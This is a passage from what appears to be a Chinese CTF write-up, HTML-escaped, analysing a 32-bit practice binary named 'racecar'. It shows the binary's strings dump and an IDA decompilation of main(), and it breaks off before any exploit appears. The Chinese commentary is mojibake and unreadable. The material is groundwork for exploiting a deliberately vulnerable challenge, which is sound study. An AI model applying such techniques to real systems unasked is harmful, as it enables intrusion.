class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;171&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/lib/ld-linux.so.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.so.6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_stdin_used&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;srand&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fopen&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;putchar&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stdin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;printf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fgets&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;strlen&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;read&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stdout&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alarm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;atoi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sleep&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__cxa_finalize&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;setvbuf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;strcmp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__libc_start_main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__stack_chk_fail&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GLIBC_2.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GLIBC_2.1.3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GLIBC_2.4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_ITM_deregisterTMCloneTable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__gmon_start__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_ITM_registerTMCloneTable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gfff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gfff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gfff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gfff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UWVS&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[^_]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[1;33m&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[1;36m&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[1;32m&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[1;31m&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[1;34m&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[1;35m&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%s      ______                                       %s|xxx|&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%s     /|_||_\`.__                                   %s| F |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%s    (   _    _ _\                                  %s|xxx|&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%s*** =`-(_)--(_)-&amp;#x27;                                  %s| I |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                                   %s|xxx|&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                                   %s| N |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                                   %s| I |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%s             _-_-  _/\______\__                    %s| S |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%s           _-_-__ / ,-. -|-  ,-.`-.                %s|xxx|&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%s            _-_- `( o )----( o )-&amp;#x27;                 %s| H |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%s                   `-&amp;#x27;      `-&amp;#x27;                    %s|xxx|&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Select race:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1. Highway battle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2. Circuit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%s[-] Invalid choice!%s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Select car:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Waiting for the race to finish...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] You won the race!! You get 100 coins!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Current coins: [%d]%s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[!] Do you have anything to say to the press after your big victory?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; %s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%s[-] Could not open flag.txt. Please contact the creator.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[-] You lost the race and all your coins!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%sInsert your data:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Name:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Nickname:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%s[+] Welcome [%s%s%s]!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%s[*] Your name is [%s%s%s] but everybody calls you.. [%s%s%s]!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Current coins: [%d]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Car #1 stats:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[Speed]:        %s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[Acceleration]: %s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[Handling]:     %s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Car #2 stats:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[Speed]:        %s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[Acceleration]: %s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[Handling]:     %s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1. Car info&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2. Car selection&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;*2$&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;crtstuff.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;deregister_tm_clones&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__do_global_dtors_aux&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;completed.7283&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__do_global_dtors_aux_fini_array_entry&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;frame_dummy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__frame_dummy_init_array_entry&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;racecar.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__FRAME_END__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__init_array_end&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_DYNAMIC&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__init_array_start&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__GNU_EH_FRAME_HDR&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_GLOBAL_OFFSET_TABLE_&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__libc_csu_fini&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;strcmp@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;read@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_ITM_deregisterTMCloneTable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__x86.get_pc_thunk.bx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;printf@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fgets@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_edata&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;time@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sleep@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alarm@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__stack_chk_fail@@GLIBC_2.4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__x86.get_pc_thunk.dx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__cxa_finalize@@GLIBC_2.1.3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;banner&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__data_start&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__gmon_start__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exit@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__dso_handle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_stdin_used&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;race_type&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;srand@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;strlen@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__libc_start_main@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__libc_csu_init&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;car_menu&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stdin@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;read_int&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;setvbuf@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fopen@@GLIBC_2.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;putchar@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_fp_hw&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;car_info&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stdout@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__bss_start&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;coins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__stack_chk_fail_local&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;check&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;atoi@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__TMC_END__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_ITM_registerTMCloneTable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;setup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.symtab&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.strtab&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.shstrtab&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.interp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.note.ABI-tag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.note.gnu.build-id&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.gnu.hash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.dynsym&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.dynstr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.gnu.version&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.gnu.version_r&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.rel.dyn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.rel.plt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.init&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.got&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.fini&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.rodata&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.eh_frame_hdr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.eh_frame&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.init_array&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.fini_array&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.dynamic&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.comment&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;å‘ç°é‡Œé¢æœ‰ä¸€ä¸ª flag.txt&lt;/p&gt;
&lt;p&gt;æ‹–å…¥ ida32 æŸ¥çœ‹ main å‡½æ•°&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int __cdecl main(int argc, const char **argv, const char **envp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v3; // eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unsigned int v5; // [esp+0h] [ebp-Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v5 = __readgsdword(0x14u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setup();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  banner();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  info();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  while ( check )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v3 = menu();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if ( v3 == 1 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      car_info();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else if ( v3 == 2 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      check = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      car_menu();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      printf(&amp;quot;\n%s[-] Invalid choice!%s\n&amp;quot;, &amp;quot;\x1B[1;31m&amp;quot;, &amp;quot;\x1B[1;36m&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return __readgsdword(0x14u) ^ v5;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;setup ();banner ();info (); è¿›è¡Œäº†åˆå§‹åŒ–&lt;/p&gt;
&lt;p&gt;åŒå‡» while (check) å¯å¾—çŸ¥ check ä¸º 1ï¼Œ&lt;/p&gt;
&lt;p&gt;v3 = menu (); ç›´æ¥è°ƒç”¨äº† menu æˆ‘ä»¬å» menu æŸ¥çœ‹ä¸€ä¸‹&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span 